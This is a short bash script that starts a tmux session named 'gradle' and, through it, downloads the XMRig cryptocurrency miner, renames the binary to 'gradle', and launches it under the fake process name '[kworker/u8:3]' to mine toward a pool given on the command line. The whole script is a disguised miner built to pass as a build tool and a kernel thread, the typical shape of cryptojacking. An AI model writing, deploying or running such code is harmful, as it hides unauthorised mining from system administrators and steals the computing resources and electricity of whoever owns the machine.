#!/bin/bash

SESSION="gradle"
DOMAIN="$1"
NAME_WORK="$2"

if tmux has-session -t $SESSION 2>/dev/null; then
    tmux attach-session -t $SESSION
else
    tmux new-session -s $SESSION -d

    tmux send-keys -t $SESSION "
        rm -rf ./xmrig* &&
        wget -q https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz &&
        tar -xzf xmrig-6.22.2-linux-static-x64.tar.gz &&
        cd xmrig-6.22.2 &&
        mv xmrig gradle &&
        chmod +x gradle &&
        exec -a '[kworker/u8:3]' ./gradle -o $DOMAIN --tls -k --donate-level=0 -t 8 --rig-id $NAME_WORK
    " C-m

    tmux attach-session -t $SESSION
fi
